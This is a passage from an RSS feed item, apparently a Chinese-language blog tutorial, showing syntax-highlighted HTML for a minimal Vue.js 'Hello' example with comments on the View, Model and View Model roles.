</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span> <span class="c">&lt;!-- View --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, {{name}}!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 在代码中，可以使用vm代表Vue实例，vm表示View Model
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span> <span class="c1">// View Model
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="o">:</span> <span class="p">{</span> <span class="c1">// Model
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Vue.js&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>

